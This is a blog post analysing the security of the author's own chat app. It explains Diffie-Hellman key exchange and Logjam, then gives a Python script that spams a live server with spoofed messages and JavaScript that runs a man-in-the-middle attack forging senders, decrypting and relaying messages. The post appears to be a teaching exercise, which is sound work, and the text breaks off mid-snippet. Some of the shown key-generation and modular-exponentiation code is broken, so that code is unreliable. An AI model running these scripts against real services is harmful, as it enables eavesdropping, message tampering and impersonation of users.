---
title: Iteration 2 - Diffie-Hellman Key Exchange

date: '3rd January 2024'
description: Chat Application Security Analysis - Part 4
---
#### Chat Application Security Analysis - Part 4
---
[Iteration 2 source code](https://github.com/sohumshah2/chatapp/tree/e131140cf473fd4b484b2301f63faf1041412a11)

Let’s begin thinking about encryption. We want two users to be able to exchange messages securely over the internet, but eavesdroppers may be listening in and attempting to tamper with the data. Traditional encryption algorithms use a single secret key for both encryption and decryption, but securely sharing this key is a challenge. Sending the key over the same insecure channel as the messages wouldn’t work, as eavesdroppers could simply intercept it. Furthermore, it may be impractical for the two users to meet in person and agree upon a shared key in advance. So how can two users agree on a shared secret, while communicating openly? 

### One way functions
To address this problem, let’s consider the idea of one way functions. A one-way function is easy to compute in one direction, but given an output, it is difficult to find a corresponding input. For example, it is easy to multiply two prime numbers together and obtain the product, but given the product, it is very difficult to obtain the prime numbers. We want to use one-way functions in a way that allows both users to perform straightforward computations, while making it very challenging for an eavesdropper to reverse-engineer the process.

### Modular arithmetic and the discrete logarithm problem
One such ‘one-way function’ is the discrete logarithm problem. This problem uses modular arithmetic. Imagine you have a standard 12 hour analog clock. Suppose it is 11 o’clock and you want to know the time in 4 hours. Of course, it will be 3 o’clock. Really, 11 + 4 is 15, but our clock only has 12 hours. So, we wrap around to 1 whenever we need to go past 12. 11 + 1 is 12. 12 + 1 is 1. Now, 1 + 1 is 2. 2 + 1 = 3. We’ve added 4 to 11 to obtain 3. 

Modular arithmetic is a way of working with numbers that wrap around in this cyclic manner. We can see that 15 is related to 3 on this clock in the sense that it has the same position when we wrap around. Similarly, we could add another 12 to 15, to obtain 27. This can be visualised as moving from the ‘15’ position by 12 hours around the entire clock, returning to the same position. Hence, 12, 15 and 27 are all related on this clock. We say that 15 is congruent to 3, modulo 12. It is also congruent to 27 modulo 12. 12 here is called the ‘modulus’.

Let’s make the input number a power. It turns out that calculating something like 2x mod 523 for some known x is easy and can be done quickly, but given the output, it is very difficult to find x. 
2423 mod 523 for instance can be quickly computed to 136, but given the output of 136, it is difficult to find the input, 423. Maybe not so difficult with these small numbers as there are only 523 numbers to test (powers of 2 from 0 to 522), but if the modulus was hundreds or thousands of digits long, it would be very difficult.


It is important that the modulus and power is chosen carefully.

Let’s use a prime modulus, say 7, and a base of 2. Let’s look at the powers of 2 modulo 7.

<Table
  data={[
    { superscript: '21 mod 7', item1: '2 mod 7', item2: '2 = 0 × 7 + 2', item3: '2' },
    { superscript: '22 mod 7', item1: '4 mod 7', item2: '4 = 0 × 7 + 4', item3: '4' },
    { superscript: '23 mod 7', item1: '8 mod 7', item2: '8 = 1 × 7 + 1', item3: '1' },
    { superscript: '24 mod 7', item1: '16 mod 7', item2: '16 = 2 × 7 + 2', item3: '2' },
    { superscript: '25 mod 7', item1: '32 mod 7', item2: '32 = 4 × 7 + 4', item3: '4' },
    { superscript: '26 mod 7', item1: '64 mod 7', item2: '64 = 9 × 7 + 1', item3: '1' },
  ]}
/>

Notice that the outputs are not unique. If I told you that 2<sup>x</sup> mod 7 = 2, and you tried to brute force and manually calculate powers of 2 modulo 7 until you found an answer of 2, each try would have a probability of ⅓, not ⅙. We want to use a base that results in a uniformly distributed output, in other words, all numbers from 0 to the modulus minus one should appear. Such a base is called a primitive root of the prime modulus. Three, for instance, is a primitive root of seven, as confirmed in the table below, where the outputs are unique.

<Table
  data={[
    { superscript: '31 mod 7', item1: '3 mod 7', item2: '3 = 0 × 7 + 3', item3: '3' },
    { superscript: '32 mod 7', item1: '9 mod 7', item2: '9 = 1 × 7 + 2', item3: '2' },
    { superscript: '33 mod 7', item1: '27 mod 7', item2: '27 = 3 × 7 + 6', item3: '6' },
    { superscript: '34 mod 7', item1: '81 mod 7', item2: '81 = 11 × 7 + 4', item3: '4' },
    { superscript: '35 mod 7', item1: '243 mod 7', item2: '243 = 34 × 7 + 5', item3: '5' },
    { superscript: '36 mod 7', item1: '729 mod 7', item2: '729 = 104 × 7 + 1', item3: '1' },
  ]}
/>

Using a prime modulus that is hundreds of digits long, and a corresponding base that is a primitive root, calculating the output can be done in milliseconds, but given the output, working out the input power would take hundreds or thousands of years, even with significant computing power. This problem is known as the discrete logarithm problem, and it is computationally intractable.

### The Diffie-Hellman solution
We want to utilise modular exponentiation as a building block towards a key exchange protocol. By sharing only the result of a modular exponentiation, it will be essentially impossible for an eavesdropper to determine the input.

Suppose Alice and Bob want to establish a shared secret over the internet. They both agree on a large prime number, p, and a primitive root of p, we’ll call g. These values will be public so an eavesdropper would know them. Alice computes g<sup>a</sup> mod p and Bob computes g<sup>b</sup> mod p. They exchange these computed values over the internet, exposing them to eavesdroppers. Now, Alice takes the received g<sup>b</sup> mod p, and raises it to the power of a, before calculating the result modulo p. Similarly, Bob takes the received g<sup>a</sup> mod p, raises it to b and calculates the result modulo p. Using modular arithmetic rules, we can deduce that (g<sup>a</sup> mod p)<sup>b</sup> mod p = (g<sup>b</sup> mod p)<sup>a</sup> mod p = g<sup>ab</sup> mod p.

Hence, Alice and Bob have agreed on a shared key, g<sup>ab</sup> mod p! Let’s consider what an eavesdropper knows. They know the publicly available values g and p, as well as the transmitted numbers g<sup>a</sup> mod p and g<sup>b</sup> mod p. If an eavesdropper knows the protocol used, they know the formula for the transmitted numbers. They know the base and the modulus, but they don’t know the powers, a and b. In order to work out the shared key, g<sup>ab</sup> mod p, they would need to determine either a or b. If they can work out a, for instance, they can then just follow the procedure Alice used, raising g<sup>b</sup> mod p by a, and computing the result modulo p, to determine the shared key. However, calculating a or b is precisely the discrete logarithm problem, which is infeasible to solve with the way we’ve chosen our parameters. 

This solution is known as Diffie-Hellman key exchange, developed by Whitfield Diffie and Martin Hellman in 1976. It offers an efficient and secure method for two parties to agree upon a shared secret key, communicating over an insecure channel.

### Implementing Diffie-Hellman
We implement the Diffie-Hellman key exchange protocol in a JS file, diffieHellman.js.

#### Logjam vulnerability
The Logjam vulnerability is a vulnerability that affects the Diffie-Hellman protocol when 512 bit or smaller prime numbers are used. The vulnerability utilises the number sieve algorithm, which is considered the most effective algorithm to find discrete logarithms. Note that it is still exponential. This algorithm consists of four computationally intensive steps, but the first three only depend on the value of p, and not the other parameters. Hence, the results of the first three steps could be precomputed and used to quickly solve any discrete log problem with that modulus p. As it turned out, 512 bit modulus values were commonly used on the internet and in fact very few unique values were used, so this attack could facilitate the decryption of much of internet traffic. The authors of the vulnerability also estimated that the attack, if conducted on larger, 1024 bit primes, would cost some hundreds of millions of dollars for the precomputation, which they noted was viable for a nation-state agency such as the NSA. They recommended the use of 2048 bit primes or larger, or consider switching to a different number system to conduct the Diffie-Hellman protocol on, such as elliptical curves.

#### Choosing parameters
The Logjam vulnerability highlights the risks associated with choosing and reusing small prime numbers.
However, so long as a large enough prime number is chosen, the vulnerability will be infeasible and so the prime can be reused safely. To ensure mathematically secure parameters are chosen, I used the 3072-bit group posted on RFC 3526, with the prime p and generator g values shown below. These values were generated following strict criteria and have been analysed to ensure they are safe to use.

```javascript
// RFC 3526 - 3072-bit MODP Group 15
const pString = `
FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1
29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD
EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245
E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED
EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D
C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F
83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D
670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B
E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9
DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510
15728E5A 8AAAC42D AD33170D 04507A33 A85521AB DF1CBA64
ECFB8504 58DBEF0A 8AEA7157 5D060C7D B3970F85 A6E1E4C7
ABF5AE8C DB0933D7 1E8C94E0 4A25619D CEE3D226 1AD2EE6B
F12FFA06 D98A0864 D8760273 3EC86A64 521F2B18 177B200C
BBE11757 7A615D6C 770988C0 BAD946E2 08E24FA0 74E5AB31
43DB5BFC E0FD108E 4B82D120 A93AD2CA FFFFFFFF FFFFFFFF
`;
const pStringNoWhitespace = pString.replace(/\s/g, '')
const p = BigInt('0x' + pStringNoWhitespace)
const g = BigInt(2)
```

#### Modular exponentiation
The primary mathematical computation involved in Diffie-Hellman key exchange is modular exponentiation, in other words, raising a base to some power and computing the result modulo p.

The naive way to implement this is to keep multiplying the base by itself, and then floor dividing by the modulus. However, this is slow and the result before we floor divide will be massive if we use large inputs, taking up enormous amounts of memory. 

Instead we can use the principle that (a × b) mod m = ((a mod m) × (b mod m)) mod m. Thus, we can take the result mod m after each multiplication to ensure the numbers remain small.

To improve efficiency, we can use the  ‘square and multiply’ technique, which we discuss looking at the following code.

#### Efficient modular exponentiation
```javascript
// decomposeIntoPowersOf2 Function

// Decompose a positive integer into its
// powers of 2 representation, as an array
let decomposeIntoPowersOf2 = (num) => {
    const powersOf2 = []
    let i = BigInt(1)
    let log_i = 0
    while (i <= num) {
        if (i & num) {
            powersOf2.push(log_i)
        }
        i <<= BigInt(1)
        log_i++
    }
    return powersOf2
}
```
This helper function performs a bitwise AND operation between increasing powers of 2 and the input number and determines when they match. For instance, if the input number is 42, the computer represents this in binary as 101010. We do a bitwise AND with 1 which will evaluate to zero, since the least significant bit in the input is 0. We then left shift 1, so it becomes 10. We then do a bitwise AND with the input, which evaluates to 1 since the second least significant bit in the input is 1. Hence we know that 2 to the power of 1 is in the number, so we add the power, 1, to the output array. We continue, ultimately returning an array containing 1, 3 and 5. This makes sense since 42 equals  2<sup>5</sup> + 2<sup>3</sup> + 2<sup>1</sup>. The usage of bitwise operations makes the function very efficient. 

```javascript
// compute Function

// Compute (base^power) % mod using the
// 'square and multiply' technique
let compute = (base, decomposedPower, mod) => {
    let prev = BigInt(base) % BigInt(mod)
    let res = BigInt(1)
    let j = BigInt(0)

    if (decomposedPower[0] == 0) {
        res = prev
        j++
    }

    let i = 1

    while (i <= decomposedPower[decomposedPower.length - 1]) {
        prev = (BigInt(prev) ** BigInt(2)) % BigInt(mod)
        if (decomposedPower[j] === i) {
            res = (res * prev) % mod
        }
        if (decomposedPower[j] === i) {
            res = (res * prev) % mod
        }
        if (decomposedPower[j] <= i) {
            j++
        }
        i++
    }
    return res
}
```
The compute function raises ‘base’ to the power of the number represented by the ‘decomposedPower’ array, modulo ‘mod’. This is the primary mathematical computation involved in Diffie-Hellman key exchange. 

The function calculates increasing powers of 2 modulo ‘mod’ and stores them in ‘prev’. When a power of 2 is present in the decomposedPower, ‘res’ is multiplied by ‘prev’ and the result modulo n is stored. This efficiently performs modular exponentiation.

Let’s run through the calculation of  7<sup>11</sup> mod 5. 
- We first decompose the power, 11 into a sum of powers of 2. 
- Note that 11 =  2<sup>3</sup> + 2<sup>1</sup> + 2<sup>0</sup>. 
  - The decomposeIntoPowersOf2 function with the input of 11 will return an array, [0, 1, 3].
- Hence, 7<sup>11</sup> = 7<sup>2^3 + 2^1 + 2^0</sup> = 7<sup>2^3</sup> × 7<sup>2^1</sup> × 7<sup>2^0</sup>.
- Now, we can apply the ‘square and multiply’ technique. Set res = 1.
- 7<sup>2^0</sup> mod 5 = 7 mod 5 = **2**.
  - res ×= 2 mod 5, so res = 2.
- 7<sup>2^1</sup> mod 5 = (7<sup>2^0</sup> mod 5)<sup>2</sup> mod 5 = **2**<sup>2</sup> mod 5 = **4**.
  - res ×= 4 mod 5, so res = 8 mod 5 = 3.
- 7<sup>2^2</sup> mod 5 = (7<sup>2^1</sup> mod 5)<sup>2</sup> mod 5 = **4**<sup>2</sup> mod 5 = **1**.
  - res remains unchanged since 11 does not contain 2<sup>2</sup>.
- 7<sup>2^3</sup> mod 5 = (7<sup>2^2</sup> mod 5)<sup>2</sup> mod 5 = **1**<sup>2</sup> mod 5 = **1**.
  - res ×= 1 mod 5, so res = 3.
- Hence, 7<sup>11</sup> mod 5 = res = 3.

#### Generating keys
```javascript
// generateKeyToSend Function

export const generateKeyToSend = () => {
    const aArray = secureRandom(32, {type: 'Array'})
    const binaryString = aArray.map(value => {
      value.toString(2).padStart(8, '8')
    }).join('')

    // private key 'aBigInt' is a random number
    const aBigInt = BigInt('0b' + binaryString)

    // public key 'A' = g^a mod p
    const A = compute(g, decomposeIntoPowersOf2(aBigInt), p) 

    // return the private and public keys. 
    // Note that only the public should be transmitted over the internet.
    return {aBigInt, A} 
}
```

We use a library to generate a random 32 byte (256 bit) private value. We then use the compute function to raise g to this private value modulo p. We return this result along with the private value.

#### Computing the shared secret
```javascript
// computeSymmetricKey Function

export const computeSymmetricKey = (aBigInt, B) => {
    return new Promise((resolve, reject) => {
        const keyInput = compute(
          BigInt(B), 
          decomposeIntoPowersOf2(aBigInt), 
          p
        );
        const keyInputArray = bigintToUint8Array(keyInput);
        const hash = 'SHA-256';
        const length = 32;
        const info = '';
        const salt = new Uint8Array();
        hkdf.compute(keyInputArray, hash, length, info, salt)
            .then((derivedKey) => {
                const aesKey = uint8ArrayToHexString(derivedKey.key);
                resolve(aesKey);
            })
            .catch(reject);
    });
}
```

We use our private value, a, as well as the received public value, B, which is just g<sup>b</sup> mod p. We raise ‘B’ to ‘a’ mod ‘p’ to obtain the shared key, g<sup>ab</sup> mod p. 

#### Key derivation functions
We then use a key derivation function (KDF) to derive a key suitable for the AES-256 encryption algorithm. In the chat app, we use the HMAC-based key derivation function (HKDF). The KDF removes any patterns that may be present in the shared key gab mod p, turning it into a key with a higher level of entropy.

HKDF essentially hashes the input aesKey with a cryptographic hashing algorithm. The hash is then iteratively expanded into a desired length, 256 bits in our case, by applying the HMAC algorithm multiple times, with each iteration extending the result and feeding it back into the HMAC algorithm. The HMAC (hash-based message authentication code) algorithm is described later in this report.

### Integrating Diffie-Hellman into the chat app
Let’s have a look at how these two functions (generateKeyToSend, computeSymmetricKey) are used in the chat app.

```javascript
const handleSendMessage = () => {

  // Conduct a Diffie-Hellman handshake if the receiver is new
  if (connectionEstablishedWithRef.current !== receiverRef.current) {

    // Notify old receiver that the connection has closed
    if (connectionEstablishedWithRef.current !== '') {
      socket.emit("sendMessage", {
        sender: senderRef.current, 
        receiver: connectionEstablishedWithRef.current, 
        message: aes256.encrypt(aesKeyRef.current, 'seashells_end'), 
        handshake: true
      });
    }
    setWaitingForHandshakeResponse(true)
    const dh = generateKeyToSend()
    setDiffieHellmanPrivate(dh.aBigInt)
    setDiffieHellmanPublic(dh.A)
    const handshakeMessage = {
      'sender': senderRef.current,
      'receiver': receiverRef.current,
      'message': dh.A.toString(),
      'handshake': true,
    }

    // Send handshake message and wait for a reply
    establishConnection2(handshakeMessage).then((handshakeReply) => {
        // When we receive the handshake reply, compute the shared key
        setConnectionEstablishedWith(handshakeReply.sender)
        setWaitingForHandshakeResponse(false)
        setDiffieHellmanReceiverPublic(BigInt(handshakeReply.message))
        computeSymmetricKey(
          diffieHellmanPrivateRef.current, 
          BigInt(handshakeReply.message)
        ).then((aesKey) => {
          setAesKey(aesKey)
    
          // Send the encrypted message
          const encryptedMessage = aes256.encrypt(
            aesKeyRef.current, 
            `seashells_${message}`
          )
          socket.emit("sendMessage", {
            sender: senderRef.current, 
            receiver: receiverRef.current, 
            message: encryptedMessage, 
            handshake: false, 
          });
        })
    })
  }
}
```

```javascript
// Establishes a connection with a recipient 
// using a handshake mechanism.

// Returns a promise that resolves with the 
// received handshake reply message.

const establishConnection2 = (handshakeMessage) => {
  return new Promise((resolve, reject) => {

    // Helper function handles incoming broadcast messages and
    // resolves the promise when a valid handshake reply 
    // message is received for the specified sender.
    const broadcastListener = (message) => {
      if (message.receiver === senderRef.current && message.handshake) {
        resolve(message);
        socket.off('broadcastMessage', broadcastListener);
      }
    };

    // Register the broadcast listener for 'broadcastMessage' events
    socket.on('broadcastMessage', broadcastListener);

    // Send the handshake message to initiate the connection
    socket.emit('sendMessage', handshakeMessage);
  });
}
```

As demonstrated in the code snippets above, when the user clicks the send button to send a message to a new receiver, the client code calls the generateKeyToSend function to generate the Diffie Hellman parameters a and A (A = g<sup>a</sup> mod p). The public key A is then sent in a handshake message to the recipient. The recipient will respond analogously, generating b and B (B = g<sup>b</sup> mod p), and sending the public key B. The user will then call computeSymmetricKey to compute the shared key, g<sup>ab</sup> mod p and use the HKDF algorithm to derive a suitable AES key. Then the user encrypts the message with this key and sends it to the receiver.


The snippet below shows how the recipient handles an incoming handshake request. If it currently has a connection with another user, it sends a message letting them know the connection has closed and we are discarding the shared key we had established. The recipient then generates a prime number b and the public key B (B = g<sup>b</sup> mod p). They then compute the AES key and send back B. 

```javascript
// broadCastMessage Listener snippet
    
socket.on("broadcastMessage", (msg) => {
  // ...
  if (msg.handshake && msg.receiver === senderRef.current) {

    // Receiving a handshake request from a new client
    // We inform the old client that the connection has closed
    if (connectionEstablishedWithRef.current !== '') {
      socket.emit("sendMessage", {
        sender: senderRef.current, 
        receiver: connectionEstablishedWithRef.current, 
        message: aes256.encrypt(aesKeyRef.current, 'seashells_end'), 
        handshake: true
      });
    }

    // Establish parameters and compute the symmetric AES key
    setConnectionEstablishedWith(msg.sender)
    setReceiver(msg.sender)
    setDiffieHellmanReceiverPublic(msg.message)
    const dh = generateKeyToSend()
    setDiffieHellmanPrivate(dh.aBigInt)
    setDiffieHellmanPublic(dh.A)
    socket.emit("sendMessage", {
      'sender': senderRef.current,
      'receiver': msg.sender,
      'message': dh.A.toString(),
      'handshake': true,
    })
    computeSymmetricKey(dh.aBigInt, msg.message).then((aesKey) => {
      setAesKey(aesKey)
    })
  }
});
```

### Functionality
Here is a video demoing the functionality of the chat app. A python script is also running, displaying the messages being broadcasted by the server.

<YouTube id="P076pLaztxI"/>

We can see that when Magnus presses the ‘Send’ button, the dhPub (A) and dhPriv (a) variables are set. A message is sent to Elia, the contents of which are a very large number. This is the public key, A. Elia then receives the message and sets here dhPriv (b) and dhPub (B) variables. She then computes an aesKey, ‘ec6914…’. She sends a message back to Magnus containing another very large number, her public key. Magnus then receives the message and computes the same AES key. Magnus then sends a message, ‘AZqmb…’, which encrypts ‘hello elia’. Looking at the logged messages, it is clear that our code now obfuscates the plaintext message ‘hello elia’ from any snoopers. Our chat app now provides confidentiality.

### Assessing spam and integrity
One issue with our solution is that encryption algorithms such as AES-256 do not offer integrity. Given some ciphertext, there is no way to tell whether that ciphertext has been modified. If some ciphertext is randomly changed, it is likely that the corresponding deciphered text will be unintelligible garbage, but it will still be able to be deciphered. We don’t have a great system to detect modified messages, other than noting that they are unintelligible. So an attacker could spam random messages to a user, and these messages would be rendered as random text when decrypted. The code snippet below conducts this ‘spam attack’, and this is showcased here.
```python
# diffieHellmanSpam.py

import socketio

targetA = 'Magnus'
targetB = 'Elia'

sio = socketio.Client(reconnection=False)

@sio.event
def connect():
    print("Connected to the server")

@sio.on("broadcastMessage")
def receive_message(message):
    print(f"Received message from server: {message}")

sio.connect("https://chatappserver-ucb7.onrender.com")

count = 1
while True:
    count += 1
    sio.emit("sendMessage", {
        'sender': targetA,
        'receiver': targetB,
        'message': 'qwertyuiopasdfghjklzxcvbnm' * count,
        'handshake': False
    })
    sio.sleep(1)
```



<YouTube id="vIDcuQ29li8"/>

One way to counteract this attack is to agree upon a shared prefix that all messages must start with. This prefix can be public. The message will be encrypted and sent. The receiver can decrypt the message and check whether the prefix is present. If it is not, they can be confident that the message has not been sent by the recipient who knows the secret key, or it has been tampered with, modified by a third party. 

In our code we use the prefix ‘seashells_’. The implementation of validating an incoming message is shown in the snippet below.

```javascript
// broadcastMessage Listener snippet

if (decryptedMessage.startsWith("seashells_")) {
  decryptedMessage = decryptedMessage.slice(10)
  msg.message = decryptedMessage
  setMessages((prevMessages) => [...prevMessages, msg]);  
}
```

We can see in the following demo that the jargon messages being sent are now filtered out and are not visible to the end users:
<YouTube id='YdKUfIT70Ms'/>

On top of addressing spam, our solution seems to verify message integrity. We noted that if you tried altering the ciphertext a little, you might see that the corresponding text when deciphered changes drastically and is unintelligible. 

However, block ciphers such as AES-256 are malleable. If the operation mode of the block cipher is known, an attacker can actually modify the ciphertext in such a way that the corresponding input text is readable and has been altered. Thus it could be possible that an attacker modifies the ciphertext sent by Alice to Bob in such a way that when decrypted, the message will still start with ‘seashells_’ but the rest of the message will be altered. Our prefix solution is not cryptographically secure and does not offer integrity.

#### Message authentication codes
A more sophisticated and secure solution is the use of a message authentication code. Suppose Alice and Bob want to communicate and they have established a shared secret key using the Diffie-Hellman protocol. This key will be used to encrypt messages. Alice and Bob can use the protocol again to generate another secret key. When Alice wants to send a message, she can append the secret key to it and use a MAC algorithm, which is typically based on cryptographic hash functions such as SHA-256, to obtain a MAC tag. She then sends the message without the secret, and also sends the MAC tag. Upon receiving the message, Bob will append the same secret key and use the same algorithm to compute a MAC tag. If the computed tag matches the tag Bob receives, he can be confident that the message is genuine and has not been tampered with. An attacker can modify the message but without the secret key, they wouldn’t be able to compute the valid corresponding MAC tag. 

This simple implementation of a message authentication code is susceptible to length extension attacks. If an attacker knows the length of the message as well as the MAC tag, which is a hash of the message, they can append extra data to the end of the message and produce a new valid hash. They can then send the new message and hash and the recipient will recompute the same hash, believing the message has not been altered.

In practice, more sophisticated MAC algorithms are used such as HMAC, the hash-based message authentication code. To summarise this algorithm, it uses two secret keys. We append the first key to the message and calculate the hash. We then append the second key to the output and calculate its hash. The result will be the MAC tag sent alongside the message. 

This prevents length extension attacks. The first stage of HMAC, appending a secret key to the message and calculating its hash is analogous to the standard MAC implementation described earlier. Knowing the message and the hash, an attacker could extend the message and find a new valid hash for the extended message. But with HMAC, the output of the first hash is not revealed. In fact, it is of a fixed length since hashing algorithms take a variable length input and produce a fixed length output. So there is no way to perform a length extension attack on the second hash, since the input to it will always be of a fixed length. 

### One final tweak
Suppose Alice and Bob have established a secure connection and have been messaging for several days. Bob leaves his computer unattended for a few minutes but realises that an attacker could have opened his laptop and seen the shared aesKey. So he wants to recalculate a new private key and the corresponding public key. He wants to send the new public key to Alice so they can recompute a new shared aesKey. Let’s modify the code to facilitate this.

```javascript
// broadcastMessage Listener snippet

// ...
if (msg.sender === connectionEstablishedWithRef.current) {
  setDiffieHellmanReceiverPublic(msg.message)
  computeSymmetricKey(diffieHellmanPrivateRef.current, msg.message).then((
    aesKey) => {
    setAesKey(aesKey)
  })
}
// ...
```

The code implements this functionality so if the user we have established a connection with resends a public key, we recalculate the aesKey.

### Assessing authentication
Looks like the messages we send are now confidential in our chat app. Does our chat app authenticate users? 

Well, users are still being identified by a username, which they can choose. Hence, an attacker could pretend to be ‘Alice’ simply by changing their username to Alice. We do not have authentication in our chat app. When Alice wants to send a message to Bob, she first computes the Diffie-Hellman keys and sends a handshake message to Bob. But how can she be sure that she is sending the message to the real Bob and not someone else who set their username to Bob? How can she be sure that the handshake reply she gets comes from the real Bob? Of course, she can’t be sure. It’s possible that a secure connection has been established with a fraudulent Bob.

Now suppose Alice is weary of this possibility, so after establishing a secure connection with Bob, she asks Bob a question about her that he would know the answer to, but any attacker wouldn’t. Something like ‘what is my birthday?’ She receives a correct reply from Bob, so now she is confident that she has secured a connection with the real Bob. If a fraudulent Bob accepted the connection, they wouldn’t know the answer.

When used like this, it appears that our chat app provides authentication, but in reality our app is vulnerable to a very sneaky attack. An attacker can make Alice and Bob both believe they have established a secure connection. They can receive each other’s messages and they can verify the messages are being encrypted. But yet the attacker can somehow discreetly view all messages, and even modify them at their will.

### A man in the middle (MITM) attack
Our chat app is vulnerable to a man in the middle attack. Here’s how it works.

Suppose Alice wants to communicate with Bob. She first chooses a private number, a, and computes the public key g<sup>a</sup> mod p, sending it to Bob. An attacker, Jax, intercepts the message before it reaches Bob. Jax chooses his own private number, j, computes the public key g<sup>j</sup> mod p, and sends it back to Alice, pretending to be Bob. Alice and Jax then both compute the shared key g<sup>aj</sup> mod p. 

Alice believes that she has set up a connection with Bob but really the connection is with Jax. To complete the attack, Jax needs to convince Bob he has established a connection with Alice. So Jax sends his public key g<sup>j</sup> mod p to Bob, pretending to be Alice, and Bob replies with his public key, g<sup>b</sup> mod p. Jax and Bob each compute the shared key, g<sup>bj</sup> mod p. Now Alice and Jax have established a shared secret, g<sup>aj</sup> mod p, and Bob and Jax have established a shared secret, g<sup>bj</sup> mod p.

Whenever Alice sends a message to Bob, she will encrypt it with the key g<sup>aj</sup> mod p first. Jax will intercept the message, decrypt it, potentially modify it, re-encrypt it with the key g<sup>bj</sup> mod p and send it to Bob. Bob will then decrypt the message with the key g<sup>bj</sup> mod p. Alice and Bob have no idea Jax is sitting in the middle decrypting all the messages sent between them.

#### Implementing this attack
Since our chat app allows parties who have established a connection to send an updated public key and have the receiver recompute a new shared key, our attack can be conducted remotely without needing to prevent a message packet from being sent successfully to the server. An automated script can be rewritten to listen for handshake messages emitted by the server and perform the MITM attack anytime anyone uses the chat app.

We implement a targeted attack on chosen targets for simplicity.
```javascript
// diffieMITM.js broadcastMessage Listener snippet

// Establish a shared secret with targetA
if (message.sender === targetA && message.receiver === targetB && !
  interceptedTargetA) {
  interceptedTargetA = true
  diffieHellmanPublicTargetA = message.message
  const dh = generateKeyToSend()
  diffieHellmanPrivateUs = dh.aBigInt
  diffieHellmanPublicUs = dh.A

  computeSymmetricKey(diffieHellmanPrivateUs,
    diffieHellmanPublicTargetA).then((
    aesKey) => {
    aesKeyWithTargetA = aesKey
  })
  ourMessages.push(diffieHellmanPublicUs.toString())

  // Send a public key to targetA pretending to be targetB
  // So targetA can generate the same shared secret
  setTimeout(() => {
    socket.emit('sendMessage', {
      sender: targetB,
      receiver: targetA,
      message: diffieHellmanPublicUs.toString(),
      handshake: true,
    })
  }, 1000)
}
```

The attack is written in diffieMITM.js. We set up a listener to listen for messages emitted by the server. We set targetA and targetB to the victims’ usernames. When a handshake message is sent by targetA to targetB, targetB will send a handshake reply and they will establish a shared key. We will also see the message sent to targetB and we will reply with our own public key, with the ‘sender’ field set to targetB. TargetA will see that targetB has updated their public key, so targetA will recompute a shared key using our public key. We have now established a shared key with targetA.

We will also send targetB a message with our public key, with the sender field set to targetA. targetB will see that targetA has updated their public key, so targetB will recompute a shared key using our public key. We have now also established a shared key with targetB. Voila.

Now, when targetA sends a message to targetB, it will be encrypted with the key shared with us, not with the key targetB has. So, when targetB tries to decrypt the message, it will become garbage. It won’t start with ‘seashells_’ so targetB will discard the message and it won’t be shown to the end user. 

As seen in the below snippet, we listen for this message. Since it is encrypted with the key shared with us, we can decrypt it. We can then encrypt it with ‘aesKeyWithTargetB’, the key we share with targetB and send it to targetB, with the sender field set to targetA. targetB will then decrypt the message successfully without raising suspicion.

```javascript
// diffieMITM.js broadcastMessage Listener snippet

// ...
else if (message.sender === targetA && message.receiver === targetB &&
  interceptedTargetA && interceptedTargetB && !ourMessages.includes(
    message.message)) {
  const decryptedMessage = aes256.decrypt(aesKeyWithTargetA, message
    .message)

  // Record decrypted message
  console.log(`${targetA} -> ${targetB}: ${decryptedMessage}`)

  const encryptedMessage = aes256.encrypt(aesKeyWithTargetB, 
    decryptedMessage)
  ourMessages.push(encryptedMessage)
  setTimeout(() => {
    socket.emit('sendMessage', {
      sender: targetA,
      receiver: targetB,
      message: encryptedMessage,
      handshake: false,
    })
  }, 100);
}
// ...
```

#### Security theatre and unintended consequences
We can see that the feature to allow resending an updated public key and have the receiver recompute a new shared key, as well as the spam protection ‘seashells_’ feature actually allow this man in the middle attack to occur remotely without the need to intercept and modify network packets in real-time. Without the spam protection, for instance, Alice and Bob would see a jargon message arriving moments before they receive every readable message, which would surely raise suspicion. 

It is critical that we thoroughly analyse the security implications of new features. The feature to allow a receiver to recompute a new shared key upon receiving an updated public key was justified earlier to improve security; changing keys regularly is a good thing, right? In addition, we saw earlier that the spam attack protection appeared to provide data integrity, as it would block out rudimentary attempts to tamper with transmitted ciphertext. But both these features can be considered security theatre. They appeared to improve security, but in reality, they facilitated the remote MITM attack. A takeaway we can make is that it is important to incorporate security into the design process of a system from the beginning. Adding security ‘features’ as an afterthought because they sound appropriate is not sufficient.

### MITM Attack demos
Here are a series of MITM attacks we can perform.

#### Discreetly sniffing messages
<YouTube id='cVTA_6H7Ryw'/>
In this demo, Magnus and Elia are using the chat app to communicate, but we perform a man in the middle attack. The terminal on the right logs all messages. Here’s a summary of what transpires:
- Magnus presses the send button. A handshake message is sent to Elia.
- Elia responds with a handshake reply and the two of them compute a shared aesKey, ‘d4cb297cf…’.
- Magnus then immediately sends a message containing ciphertext encrypting ‘hello elia’. Our MITM code cannot decrypt this first message since we do not know the AES key.
- A few moments later, forged messages are sent by the MITM code to Magnus and Elia, each from the other, containing an updated public key, derived from the MITM code’s chosen private key.
- Magnus and Elia both compute new AES keys and the MITM code also computes these keys. Notice the aesKeys flicker and change to become ‘e3529…’ for Magnus and ‘f90f91…’ for Elia. Both these keys are printed to the terminal running the MITM code.
- When Elia enters the message ‘helllo magnus’ and clicks the send button, it is encrypted with her key ‘f90f91…’. Magnus tries to decrypt it with his key ‘e3529…’ and gets garbage. Since it doesn’t start with ‘seashells_’, it is ignored.
- The MITM code also receives the message. It decrypts it with its shared key ‘e3529’, prints the message to the terminal, encrypts it with the key shared with Magnus, ‘f90f91…’, and sends it to Magnus.
- Magnus’s client receives the message, decrypts it successfully and displays it on his browser.
- Notice the two messages sent back to back in the console on the right.

#### Modifying messages in real time
We can also modify the messages before they are relayed as demonstrated in the code snippet below.
```javascript
// diffieMITM_ModifyMessages.js broadcastMessage Listener snippet

// ...
const decryptedMessage = aes256.decrypt(aesKeyWithTargetA, message
  .message)
console.log(
  `Original message - ${targetA} -> ${targetB}: ${decryptedMessage}`
  )
